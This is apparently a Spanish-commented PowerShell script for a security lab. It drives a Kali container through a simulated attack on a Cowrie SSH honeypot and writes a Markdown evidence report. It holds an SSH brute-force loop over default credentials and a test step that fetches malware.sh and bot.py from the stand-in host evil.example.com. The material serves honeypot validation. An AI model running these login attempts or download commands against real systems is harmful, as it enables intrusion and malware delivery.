# =============================================================
#  Valhalla SOC - Honeypot - Verificacion de ataque (Windows)
#
#  Uso (desde la carpeta honeypot/):
#    powershell -ExecutionPolicy Bypass -File .\scripts\attack_verify.ps1
#
#  Requisitos:
#    - Docker Desktop corriendo
#    - Cowrie corriendo (ejecutar verificar.bat antes si no lo esta)
#
#  NOTA: ASCII-only a proposito. Windows PS 5.x no lee UTF-8 sin BOM.
# =============================================================

$ErrorActionPreference = "Stop"

$HoneypotDir = Split-Path -Parent $PSScriptRoot
Set-Location $HoneypotDir

$Date = Get-Date -Format "yyyyMMdd-HHmmss"
$EvidenceFile = Join-Path "docs" ("EVIDENCIA-ATTACK-" + $Date + ".md")

# ----- helpers -----------------------------------------------
$Script:Results = New-Object System.Collections.ArrayList

function W {
    param([string]$Text = "")
    Add-Content -Path $EvidenceFile -Value $Text -Encoding UTF8
}

function Log {
    param([string]$Text)
    Write-Host $Text -ForegroundColor Cyan
}

function Mark-OK {
    param([string]$Id)
    [void]$Script:Results.Add([pscustomobject]@{ID=$Id; Status="OK"; Why=""})
    Write-Host ("  [OK] " + $Id) -ForegroundColor Green
}

function Mark-KO {
    param([string]$Id, [string]$Why = "")
    [void]$Script:Results.Add([pscustomobject]@{ID=$Id; Status="KO"; Why=$Why})
    Write-Host ("  [KO] " + $Id + " - " + $Why) -ForegroundColor Red
}

function Run-Cmd {
    param([string]$Cmd)
    try {
        $out = Invoke-Expression $Cmd 2>&1 | Out-String
        return @{ ok = $true; out = $out.Trim() }
    } catch {
        return @{ ok = $false; out = $_.Exception.Message }
    }
}

function Run-Kali {
    param([string]$Cmd)
    try {
        $out = docker exec valhalla-attacker sh -c $Cmd 2>&1 | Out-String
        return @{ ok = $true; out = $out.Trim() }
    } catch {
        return @{ ok = $false; out = $_.Exception.Message }
    }
}

function Count-CowrieEvents {
    # Prefer bind-mount (standalone stack); fall back to docker volume via exec
    $bindLog = Join-Path $HoneypotDir "logs\cowrie.json"
    if (Test-Path $bindLog) {
        return (Get-Content $bindLog -ErrorAction SilentlyContinue | Measure-Object -Line).Lines
    }
    try {
        $raw = docker exec valhalla-cowrie bash -c "wc -l /cowrie/cowrie-git/var/log/cowrie/cowrie.json 2>/dev/null || echo 0" 2>&1 | Out-String
        $n = ($raw.Trim() -split '\s+')[0]
        return [int]$n
    } catch { return 0 }
}

# ----- cabecera del informe -----------------------------------
New-Item -Force -ItemType Directory -Path "docs" | Out-Null
New-Item -Force -ItemType File -Path $EvidenceFile | Out-Null

W "# Valhalla SOC - Honeypot - Evidencia de simulacion de ataque"
W ""
W ("**Generado:** " + (Get-Date -Format 'yyyy-MM-dd HH:mm:ss') + "  ")
W ("**Maquina:** " + $env:COMPUTERNAME + "  ")
W ("**Usuario:** " + $env:USERNAME + "  ")
W ("**Escenario:** Attacker (Kali Linux) -> Cowrie (honeypot)")
W ""
W "> Documento generado automaticamente por scripts/attack_verify.ps1."
W ""
W "---"

Log "Iniciando simulacion de ataque..."
Log ("Informe -> " + $EvidenceFile)
Log ""

# ----- Preflight: Docker daemon --------------------------------
Log "Comprobando Docker Desktop..."
$daemon = Run-Cmd 'docker info --format "{{.ServerVersion}}"'
if ($daemon.out -notmatch "^[0-9]+\.[0-9]+") {
    Write-Host ""
    Write-Host "  ERROR: Docker Desktop no esta corriendo." -ForegroundColor Red
    Write-Host "  Abre Docker Desktop y espera a que el motor arranque, luego reintenta." -ForegroundColor Yellow
    Write-Host ""
    W "## ABORTADO - Docker daemon no responde"
    W '```'
    W $daemon.out
    W '```'
    exit 1
}
Log ("  Docker daemon v" + $daemon.out + " corriendo")

# ---- TC-A0: Docker OK ----------------------------------------
W ""
W "## TC-A0 - Entorno Docker"
W ""
$dv = Run-Cmd 'docker --version'
W '```'
W $dv.out
W '```'
if ($dv.out -match "Docker version") { Mark-OK "TC-A0" } else { Mark-KO "TC-A0" "docker no disponible"; exit 1 }

# ----- TC-A1: Cowrie corriendo --------------------------------
W ""
W "## TC-A1 - Cowrie corriendo"
W ""
Log "Comprobando contenedor valhalla-cowrie..."
$cowriePsRaw = Run-Cmd 'docker ps --filter name=valhalla-cowrie --format "{{.Names}} {{.Status}}"'
W '```'
W $cowriePsRaw.out
W '```'
if ($cowriePsRaw.out -match "valhalla-cowrie") {
    Mark-OK "TC-A1"
} else {
    W ""
    W "_Cowrie no estaba corriendo. Arrancando stack standalone..._"
    Log "Cowrie no esta corriendo. Arrancando honeypot/docker-compose.yml..."
    Run-Cmd 'docker compose up -d' | Out-Null
    Log "Esperando 40s a que Cowrie inicialice..."
    Start-Sleep -Seconds 40
    $cowriePsRaw2 = Run-Cmd 'docker ps --filter name=valhalla-cowrie --format "{{.Names}} {{.Status}}"'
    if ($cowriePsRaw2.out -match "valhalla-cowrie") { Mark-OK "TC-A1" }
    else { Mark-KO "TC-A1" "no se pudo arrancar Cowrie"; exit 1 }
}

# ----- TC-A2: Obtener IP de Cowrie ---------------------------
W ""
W "## TC-A2 - IP de Cowrie en red valhalla-net"
W ""
Log "Obteniendo IP de Cowrie..."
$Script:CowrieIP = $null
try {
    $inspectRaw = docker inspect valhalla-cowrie 2>&1 | Out-String
    $inspect = $inspectRaw | ConvertFrom-Json
    $nets = $inspect[0].NetworkSettings.Networks
    $Script:CowrieIP = $nets.'valhalla-net'.IPAddress
} catch {}

W '```'
W ("IP de Cowrie (valhalla-net): " + $Script:CowrieIP)
W '```'
if ($Script:CowrieIP -and $Script:CowrieIP -ne "") {
    Mark-OK "TC-A2"
} else {
    Mark-KO "TC-A2" "no se pudo obtener la IP de Cowrie en valhalla-net"
    exit 1
}
Log ("  Cowrie IP: " + $Script:CowrieIP)

# ----- TC-A3: Levantar y conectar attacker -------------------
W ""
W "## TC-A3 - Contenedor attacker (Kali) conectado a valhalla-net"
W ""
Log "Comprobando contenedor valhalla-attacker..."

$attackerRunning = Run-Cmd 'docker ps --filter name=valhalla-attacker --format "{{.Names}}"'
if ($attackerRunning.out -notmatch "valhalla-attacker") {
    Log "Attacker no esta corriendo. Levantando..."
    $existCheck = Run-Cmd 'docker ps -a --filter name=valhalla-attacker --format "{{.Names}}"'
    if ($existCheck.out -match "valhalla-attacker") {
        Run-Cmd 'docker start valhalla-attacker' | Out-Null
    } else {
        Run-Cmd 'docker run -d --name valhalla-attacker --hostname attacker --network valhalla-net kalilinux/kali-rolling /bin/bash -c "tail -f /dev/null"' | Out-Null
    }
    Start-Sleep -Seconds 5
}

# Asegurar que esta en valhalla-net
try {
    docker network connect valhalla-net valhalla-attacker 2>&1 | Out-Null
} catch {}

$netCheck = Run-Cmd 'docker inspect valhalla-attacker --format "{{json .NetworkSettings.Networks}}"'
W '```'
W $netCheck.out
W '```'
if ($netCheck.out -match "valhalla-net") { Mark-OK "TC-A3" }
else { Mark-KO "TC-A3" "attacker no esta en valhalla-net" }

# ----- TC-A4: Instalar herramientas en Kali ------------------
W ""
W "## TC-A4 - Herramientas instaladas en Kali"
W ""
Log "Instalando nmap, openssh-client, sshpass, iputils-ping en Kali..."
$aptUpdate = Run-Kali "apt-get update -qq 2>&1 | tail -3"
$aptInst   = Run-Kali "apt-get install -y -qq nmap openssh-client sshpass iputils-ping 2>&1 | grep -E '(Setting up|already|error)' | tail -10"
W '```'
W ("apt-get update: " + $aptUpdate.out)
W $aptInst.out
W '```'
$toolCheck = Run-Kali "which nmap && which ssh && which sshpass && which ping && echo ALL_OK"
if ($toolCheck.out -match "ALL_OK") { Mark-OK "TC-A4" }
else { Mark-KO "TC-A4" ("herramientas faltantes: " + $toolCheck.out) }

$CowrieIP = $Script:CowrieIP

# ----- TC-A5: Ping -------------------------------------------
W ""
W "## TC-A5 - Ping al honeypot"
W ""
Log ("Ping a Cowrie (" + $CowrieIP + ")...")
$ping = Run-Kali ("ping -c 3 " + $CowrieIP)
W '```'
W ("ping -c 3 " + $CowrieIP)
W $ping.out
W '```'
if ($ping.out -match "0% packet loss") { Mark-OK "TC-A5" }
else { Mark-KO "TC-A5" "ping fallido o perdida de paquetes" }

# ----- TC-A6: Nmap -------------------------------------------
W ""
W "## TC-A6 - Escaneo de puertos (nmap)"
W ""
Log "Nmap contra Cowrie..."
$nmap = Run-Kali ("nmap -p 2222,2223 " + $CowrieIP)
W '```'
W ("nmap -p 2222,2223 " + $CowrieIP)
W $nmap.out
W '```'
$p2222 = $nmap.out -match "2222/tcp\s+open"
$p2223 = $nmap.out -match "2223/tcp\s+open"
if ($p2222 -and $p2223) { Mark-OK "TC-A6" }
elseif ($p2222) { Mark-KO "TC-A6" "puerto 2223 no open" }
elseif ($p2223) { Mark-KO "TC-A6" "puerto 2222 no open" }
else { Mark-KO "TC-A6" "ambos puertos cerrados" }

# ----- TC-A7: Banner SSH -------------------------------------
W ""
W "## TC-A7 - Banner SSH enganoso"
W ""
Log "Leyendo banner SSH desde Kali (ssh -v)..."
# Usamos ssh -v: el banner del servidor aparece en "remote software version"
$bannerCmd = "ssh -p 2222 -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o ConnectTimeout=5 -v nobody@" + $CowrieIP + " 2>&1 | grep -i 'remote software'"
$banner = Run-Kali $bannerCmd
W '```'
W ("Banner: " + $banner.out)
W '```'
if ($banner.out -match "OpenSSH") { Mark-OK "TC-A7" }
else { Mark-KO "TC-A7" "banner inesperado o sin respuesta" }

# ----- TC-A8: Login debil ------------------------------------
W ""
W "## TC-A8 - Login con credencial debil aceptado (root / 123456)"
W ""
Log "Intentando login root:123456..."
$loginOk = Run-Kali ("sshpass -p '123456' ssh -p 2222 -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o ConnectTimeout=10 root@" + $CowrieIP + " 'whoami' 2>&1")
W '```'
W ("sshpass -p 123456 ssh root@" + $CowrieIP + " -p 2222 'whoami'")
W $loginOk.out
W '```'
if ($loginOk.out -match "root") { Mark-OK "TC-A8" }
else { Mark-KO "TC-A8" "login no aceptado o sin salida" }

# ----- TC-A9: Comandos en shell falsa ------------------------
W ""
W "## TC-A9 - Comandos en la shell falsa"
W ""
Log "Ejecutando comandos dentro del honeypot..."
$cmds = 'whoami; id; uname -a; ls /; cat /etc/hostname'
$shellOut = Run-Kali ("sshpass -p '123456' ssh -p 2222 -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o ConnectTimeout=10 root@" + $CowrieIP + " '" + $cmds + "' 2>&1")
W '```'
W ("Comandos: " + $cmds)
W ""
W $shellOut.out
W '```'
$checks = ($shellOut.out -match "root") -and ($shellOut.out -match "uid=0")
if ($checks) { Mark-OK "TC-A9" }
else { Mark-KO "TC-A9" "respuestas inesperadas de la shell falsa" }

# ----- TC-A10: wget simulado ---------------------------------
W ""
W "## TC-A10 - Simulacion de descarga de malware (wget)"
W ""
Log "Simulando wget de malware..."
$wget = Run-Kali ("sshpass -p '123456' ssh -p 2222 -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o ConnectTimeout=10 root@" + $CowrieIP + " 'wget http://evil.example.com/malware.sh; curl http://evil.example.com/bot.py' 2>&1")
W '```'
W $wget.out
W '```'
# Cowrie intercepta wget/curl - siempre da respuesta aunque no descargue nada real
if ($wget.out -ne $null) { Mark-OK "TC-A10" }
else { Mark-KO "TC-A10" "sin respuesta del honeypot" }

# ----- TC-A11: Fuerza bruta con multiples credenciales -------
W ""
W "## TC-A11 - Fuerza bruta con credenciales del userdb"
W ""
Log "Probando multiples credenciales del userdb..."

$bruteCredentials = @(
    @("root",    "toor"),
    @("admin",   "admin123"),
    @("ubuntu",  "ubuntu"),
    @("pi",      "raspberry"),
    @("admin",   "wrongpassword_XkQz9"),
    @("root",    "Str0ng!Pass#2026")
)

$bruteOk = 0
$bruteKo = 0
$bruteLog = ""

foreach ($pair in $bruteCredentials) {
    $u = $pair[0]; $p = $pair[1]
    $r = Run-Kali ("sshpass -p '" + $p + "' ssh -p 2222 -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o ConnectTimeout=5 -o NumberOfPasswordPrompts=1 " + $u + "@" + $CowrieIP + " 'echo LOGIN_OK' 2>&1")
    if ($r.out -match "LOGIN_OK") {
        $bruteLog += ("  [ACEPTADO] " + $u + ":" + $p + "`n")
        $bruteOk++
    } else {
        $bruteLog += ("  [RECHAZADO] " + $u + ":" + $p + "`n")
        $bruteKo++
    }
    Start-Sleep -Milliseconds 300
}

W '```'
W $bruteLog
W ("Aceptados: " + $bruteOk + "  |  Rechazados: " + $bruteKo)
W '```'
W ""
W "_Nota: Cowrie acepta credenciales del userdb.txt y la wildcard '*:x:*'._"
W "_Las credenciales marcadas con '!' en userdb.txt son las unicas denegadas._"
if ($bruteOk -gt 0) { Mark-OK "TC-A11" }
else { Mark-KO "TC-A11" "ninguna credencial aceptada" }

# ----- TC-A12: Eventos en cowrie.json ------------------------
W ""
W "## TC-A12 - Eventos registrados en cowrie.json"
W ""
Log "Verificando eventos en cowrie.json..."
Start-Sleep -Seconds 3

# Leer desde bind-mount (disponible en el host directamente)
$bindLog = Join-Path $HoneypotDir "logs\cowrie.json"
$jsonLines = @()
if (Test-Path $bindLog) {
    $jsonLines = Get-Content $bindLog -ErrorAction SilentlyContinue
}

$eventIds = $jsonLines | ForEach-Object {
    try { ($_ | ConvertFrom-Json).eventid } catch {}
} | Where-Object { $_ }

$grouped = $eventIds | Group-Object | Sort-Object Count -Descending
$groupedText = ($grouped | ForEach-Object { ("  " + $_.Count + "x " + $_.Name) }) -join "`n"

W '```'
W $groupedText
W '```'

$hasConnect = $eventIds -contains "cowrie.session.connect"
$hasLogin   = ($eventIds | Where-Object { $_ -match "login\.(success|failed)" }).Count -gt 0
$hasCmd     = $eventIds -contains "cowrie.command.input"
$hasClosed  = $eventIds -contains "cowrie.session.closed"

W ""
W ("- session.connect: " + $(if ($hasConnect) {"[PRESENTE]"} else {"[AUSENTE]"}))
W ("- login.success/failed: " + $(if ($hasLogin)   {"[PRESENTE]"} else {"[AUSENTE]"}))
W ("- command.input: " + $(if ($hasCmd)     {"[PRESENTE]"} else {"[AUSENTE]"}))
W ("- session.closed: " + $(if ($hasClosed)  {"[PRESENTE]"} else {"[AUSENTE]"}))

if ($hasConnect -and $hasLogin -and $hasCmd) { Mark-OK "TC-A12" }
else { Mark-KO "TC-A12" "faltan tipos de evento en el JSON" }

# ----- TC-A13: Contador de eventos crecio --------------------
W ""
W "## TC-A13 - Contador de eventos crecio durante el ataque"
W ""
$totalEvents = Count-CowrieEvents
W '```'
W ("Total de lineas en cowrie.json: " + $totalEvents)
W '```'
if ($totalEvents -gt 20) { Mark-OK "TC-A13" }
else { Mark-KO "TC-A13" ("solo " + $totalEvents + " eventos, esperados > 20") }

# ----- TC-A14: Bind-mount o volumen accesible desde host ------
W ""
W "## TC-A14 - Log accesible (bind-mount o volumen)"
W ""
$bindLog = Join-Path $HoneypotDir "logs\cowrie.json"
if (Test-Path $bindLog) {
    $sz = (Get-Item $bindLog).Length
    W '```'
    W ("logs/cowrie.json encontrado en host: " + $sz + " bytes")
    W '```'
    if ($sz -gt 0) { Mark-OK "TC-A14" }
    else { Mark-KO "TC-A14" "cowrie.json existe pero esta vacio" }
} else {
    # Intentar via docker exec (volumen nombrado)
    $volumeCheck = Run-Cmd 'docker exec valhalla-cowrie sh -c "wc -c /cowrie/cowrie-git/var/log/cowrie/cowrie.json 2>/dev/null"'
    W '```'
    W ("(bind-mount no disponible - usando volumen Docker)")
    W $volumeCheck.out
    W '```'
    if ($volumeCheck.out -match "^[1-9]") { Mark-OK "TC-A14" }
    else { Mark-KO "TC-A14" "cowrie.json no encontrado o vacio" }
}

# ----- Resumen -----------------------------------------------
W ""
W "---"
W ""
W "## Resumen"
W ""
W "| Test | Estado |"
W "|------|--------|"
$okCount = 0
$total   = 0
foreach ($r in $Script:Results) {
    $extra = if ($r.Why -ne "") { " _(" + $r.Why + ")_" } else { "" }
    W ("| " + $r.ID + " | [" + $r.Status + "]" + $extra + " |")
    if ($r.Status -eq "OK") { $okCount++ }
    $total++
}
W ""
W ("**Total: " + $okCount + " / " + $total + " tests OK**")
W ""
if ($okCount -eq $total) {
    W "### Veredicto: Simulacion de ataque completada. Todos los eventos fueron capturados por el honeypot."
} else {
    W "### Veredicto: Revisar los tests en KO antes de dar el escenario por valido."
}
W ""
W ("_Informe generado por scripts/attack_verify.ps1 el " + (Get-Date -Format 'yyyy-MM-dd HH:mm:ss') + "_")

# ----- Final -------------------------------------------------
Log ""
Log "===================================================="
Log "  Simulacion de ataque completa."
Log ("  Evidencia guardada en: " + $EvidenceFile)
Log "===================================================="
Log ""
$color = if ($okCount -eq $total) { "Green" } else { "Yellow" }
Write-Host ("  " + $okCount + " / " + $total + " tests OK") -ForegroundColor $color
Log ""
Log "El honeypot sigue corriendo. Para pararlo:"
Log "  docker compose down"
Log ""
Log "Para ver el informe:"
Log ("  notepad " + $EvidenceFile)
